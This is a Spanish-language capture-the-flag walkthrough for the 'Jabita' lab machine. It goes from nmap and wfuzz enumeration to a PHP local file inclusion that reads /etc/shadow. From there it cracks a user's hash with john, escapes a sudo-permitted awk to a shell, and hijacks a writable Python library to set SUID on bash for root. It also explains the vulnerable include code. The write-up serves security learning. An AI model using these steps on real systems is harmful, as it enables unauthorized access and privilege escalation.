@@ -1,0 +1,259 @@
+I"�T<p>Tenemos un sitio web el cual es vulnerable a LFI, aprovechandonos de eso incluiremos el archivo <strong>/etc/shadow</strong> el cual tiene un hash con SHA-512 para el usuario jack, lo crackearemos y accederemos por SSH, despues mostraremos los permisos de nivel de sudoers donde veremos que podemos abusar de <strong>awk</strong> para hacer <strong>user pivoting</strong> hacia <strong>jaba</strong>, para la escalada de privilegios haremos un <strong>Python Library Hijacking</strong></p>
+
+<h2 class="lead" id="descubrimiento-de-la-maquina">Descubrimiento de la maquina</h2>
+
+<p>Debido a que la maquina pertece a nuestra red, debemos de escanear para buscar host activos, en mi caso usare <strong>netdiscover</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netdiscover</span> <span class="o">-</span><span class="n">i</span> <span class="n">wlan0</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>i</strong>: Indica la interfaz de red</li>
+</ul>
+
+<p>Como no tengo muchos hosts en mi red, puedo deducir que la IP de la maqina es la <strong>192.168.1.86</strong>:</p>
+
+<p><img src="/assets/img/jabita/1.png" alt="" /></p>
+
+<p>Al hacerle un ping</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.86</span>
+</code></pre></div></div>
+<p>Podemos ver que tiene un <strong>TTL</strong> de <strong>64</strong>, y un TTL &lt;= 64 indica que es una maquina Linux</p>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.86</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto 2 puertos abiertos</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</code></pre></div></div>
+
+<p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.86</span>
+</code></pre></div></div>
+
+<ul>
+  <li>sCV: es la union de sC y sV
+    <ul>
+      <li>sC: nmap usa scripts para sacar mas informacion del servicio</li>
+      <li>sV: Para sacar la version y el OS que corre en ese servicio</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Esto nos arroja:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">256</span> <span class="mo">00</span><span class="ss">:b0</span><span class="p">:</span><span class="mo">03</span><span class="ss">:d3</span><span class="p">:</span><span class="mi">92</span><span class="ss">:f8:a0:f9</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="ss">:f8</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="ss">:aa:da</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">dd</span><span class="ss">:b4</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="ss">:e7</span><span class="p">:</span><span class="mi">38</span><span class="ss">:c3</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">2</span><span class="n">f</span><span class="p">:</span><span class="mo">07</span><span class="ss">:be:f8</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="ss">:bc</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">((</span><span class="no">Ubuntu</span><span class="p">))</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Site</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">)</span><span class="o">.</span>
+</code></pre></div></div>
+
+<p>Realmente no tenemos algo interesante, mas que el servidor web que usa es Apache.</p>
+
+<p>Si entramos al sitio web solo tendremos un mensaje, y al inspeccionar el codigo fuente solo una etiqueta <strong>h1</strong></p>
+
+<p><img src="/assets/img/jabita/2.png" alt="" /></p>
+
+<h3 id="fuzzing-de-directorios">Fuzzing de directorios</h3>
+
+<p>Debido a que no encontramos nada interesante, podemos hacer fuzzing de directorios mediante fuerza bruta con wfuzz</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://192.168.1.86/FUZZ'</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span>
+</code></pre></div></div>
+
+<ul>
+  <li>u: Es la URL</li>
+  <li>w: Es la wordlist</li>
+  <li>t: Es el numero de hilos (para ejecutar 100 tareas en paralelo)</li>
+  <li>hc=404: Para ocultar las respuestas con el codigo de estado 404</li>
+</ul>
+
+<p>Y nos arroja que encontro el directorio <strong>building</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">301</span>        <span class="mi">9</span> <span class="no">L</span>      <span class="mi">28</span> <span class="no">W</span>       <span class="mi">315</span> <span class="no">Ch</span>      <span class="s2">"building"</span>
+</code></pre></div></div>
+
+<h3 id="inspeccionando-el-sitio-web">Inspeccionando el sitio web</h3>
+
+<p>Al entrar el sitio web vamos a poder ver que tenemos un navbar con 3 opciones</p>
+
+<p><img src="/assets/img/jabita/3.png" alt="" /></p>
+
+<p>Al darle en una de las opciones nos daremos cuenta de la forma tan peculiar en la que se incluyen los archivos</p>
+
+<p><img src="/assets/img/jabita/4.png" alt="" /></p>
+
+<p>En una URL, la query string empieza con el simbolo <strong>?</strong>, es decir que en esta URL la query string es: <strong>?page=home.php</strong>, en este caso, el <strong>page</strong> es un parametro por GET que esta funcionando para solicitar un recurso, el cual es <strong>home.php</strong>, que basicamente incluye el archivo <strong>home.php</strong> en el sitio web.</p>
+
+<p>Parece poca cosa, pero esto es un gran indicio de un LFI</p>
+
+<h2 id="lfi-y-shell-como-jack">LFI y shell como jack</h2>
+
+<p><strong>LFI es una vulnerabilidad la cual nos permite incluir archivos locales de donde reside el servidor.</strong></p>
+
+<p>En un LFI normalito, regularmente se lee el archivo <strong>/etc/passwd</strong> para ver los usuarios del sistema e intentar leer las <strong>id_rsa</strong> de sus directorios home, tambien es posible leer archivos log para posteriormente hace un <strong>log poisoning</strong> y conseguir RCE, asi como tambien hacer uso de <strong>wrappers</strong>, pero nada de eso sera necesario en este caso.</p>
+
+<p>Probando con varios archivos, podemos ver que podemos leer el archivo <strong>/etc/shadow</strong>, este archivo almacena los hashes de las contraseñas de los usuarios, y por defecto solo el usuario root tiene permisos de leerlo</p>
+
+<p><img src="/assets/img/jabita/5.png" alt="" /></p>
+
+<p>Podemos ver que el hash del usuario <strong>jack</strong> es diferente a los demas, este empieza con un <strong>$6</strong>, el cual indica que usa <strong>SHA-512</strong>.</p>
+
+<p>En mi caso usare john para crackearlo:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s1">'$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0'</span> <span class="o">&gt;</span> <span class="nb">hash</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=</span><span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="nf">txt</span> <span class="nb">hash</span>
+</code></pre></div></div>
+
+<p>Y la contraseña es: <strong>joaninha</strong></p>
+
+<p>Sabiendo las credendiales y como en la enumeracion descubrimos el puerto 22, podemos conectarnos como <strong>jack</strong></p>
+
+<p>Y ya somo jack:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jack</span><span class="vi">@jabita</span><span class="ss">:~</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">jack</span>
+</code></pre></div></div>
+
+<h2 id="jack--jaba">jack –&gt; jaba</h2>
+
+<p>Al mirar los permisos a nivel de sudoers, podemos ver que el usuario jack puede ejecutar como el usuario jaba el comando <strong>awk</strong></p>
+
+<p><img src="/assets/img/jabita/6.png" alt="" /></p>
+
+<p>Realizando una pequeña busqueda en <a href="https://gtfobins.github.io/gtfobins/awk/">GFTObins</a> encontraremos que podemos abusar de awk para escalar privilegios, simplemente lo que esta haciendo es usar <strong>BEGIN</strong> para indicarle que ejecute <strong>system(“/bin/sh”)</strong> antes de leer el primer registro/linea de un archivo, en este caso awk no esta leyendo nada asi que simplemente se ejecuta el comando.</p>
+
+<p>Si ingresamos</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">jaba</span> <span class="n">awk</span> <span class="s1">'BEGIN {system("/bin/sh")}'</span>
+</code></pre></div></div>
+
+<p>Ya seremos <strong>jaba</strong> y podemos leer la flag de user</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jaba@jabita:/home/jack<span class="nv">$ </span><span class="nb">whoami</span> <span class="p">;</span> find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"user.txt"</span> 2&gt;/dev/null
+jaba
+/home/jaba/user.txt
+</code></pre></div></div>
+
+<h2 id="jaba--root">jaba –&gt; root</h2>
+
+<p>Al mirar los permisos de nivel de sudoers, podemos que el usuario jaba puede ejecutar como root el archivo <strong>/usr/bin/clean.py</strong></p>
+
+<p><img src="/assets/img/jabita/7.png" alt="" /></p>
+
+<p>Si lo ejecutamos lo unico que hace es imprimir <strong>Hello</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jaba@jabita:~<span class="nv">$ </span>python3 /usr/bin/clean.py
+Hello
+</code></pre></div></div>
+
+<p>Si miramos su contenido podemos ver que importa una libreria que se llama <strong>wild</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">wild</span>
+
+<span class="n">wild</span><span class="p">.</span><span class="n">first</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Para obtener mas informacion, podemos usar el comando <strong>find / -type f -name “wild.py” 2&gt;/dev/null</strong> para saber cual es la ruta del archivo <strong>wild.py</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/lib/python3.10/wild.py
+</code></pre></div></div>
+
+<p>Si vemos su contenido, lo unico que esta haciendo es definir una funcion llamada <strong>first</strong>, la cual cuando sea llamada ejecutara un <strong>print</strong> que muestre el <strong>Hello</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">first</span><span class="p">():</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Hello"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="python-library-hijacking-rw-permissions">Python Library Hijacking (RW permissions)</h3>
+
+<p>Un escenario de python library hijacking, es que se este importando una libreria la cual tiene permisos de escritura, asi que nosotros podemos modificar su contenido para que relice una accion arbitraria</p>
+
+<p>Si mostramos los permisos de la libreria <strong>wild</strong>, podemos ver que para otros usuarios tiene permisos <strong>rw</strong> (lectura y escritura)</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">29</span> <span class="no">Sep</span>  <span class="mi">5</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">.</span><span class="mi">10</span><span class="o">/</span><span class="n">wild</span><span class="p">.</span><span class="nf">py</span>
+</code></pre></div></div>
+
+<p>En mi caso modificare el archivo para darle permisos SUID a bash, no es necesario hacerlo asi, de hecho simplemente se puede indicarle que ejecute bash (pero ya es comtumbre mia jsjs):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">def</span> <span class="nf">first</span><span class="p">():</span>
+	<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod u+s /bin/bash"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Ahora solo damos <strong>bash -p</strong> y ya somos root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jaba@jabita:~<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.1# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
+<h2 id="extra-entendiendo-el-lfi">Extra: Entendiendo el LFI</h2>
+
+<p>Como extra, explicare por que el codigo del sitio web es vulnerable a LFI.</p>
+
+<p>La ruta <strong>/var/www/html/building</strong> es la que se encuentra el archivo <strong>index.php</strong> que es vulnerable:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://www.w3schools.com/w3css/4/w3.css"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;body&gt;</span>
+		 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"w3-bar w3-black"</span><span class="nt">&gt;</span>
+		  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/building/index.php?page=home.php"</span> <span class="na">class=</span><span class="s">"w3-bar-item w3-button"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
+		  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/building/index.php?page=gallery.php"</span> <span class="na">class=</span><span class="s">"w3-bar-item w3-button"</span><span class="nt">&gt;</span>Gallery<span class="nt">&lt;/a&gt;</span>
+		  <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/building/index.php?page=contact.php"</span> <span class="na">class=</span><span class="s">"w3-bar-item w3-button"</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;</span>
+		<span class="nt">&lt;/div&gt;</span> 
+	<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+<span class="cp">&lt;?php
+	include($_GET['page'])
+?&gt;</span>
+</code></pre></div></div>
+
+<p>La parte vulnerable es esta de aca:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>La funcion <strong>include</strong> permite incluir en un sitio web un archivo y evidentemente su contenido, la vulnerabilidad radica en como se incluye el archivo: <strong>$_GET[‘page’]</strong>, lo que esta haciendo es crear un parametro GET llamado <strong>page</strong> el cual va a recibir un archivo para que la funcion <strong>include</strong> lo procese y lo incluya, ejemplo: <strong>page=home.php</strong>, entonces como no se esta haciendo ninguna validacion de ningun tipo, si nosotros manipulamos el parametro <strong>page</strong> para que incluya otro archivo, simplemente va a mostrar su contenido, como lo hicimos con <strong>/etc/shadow</strong>.</p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+:ET
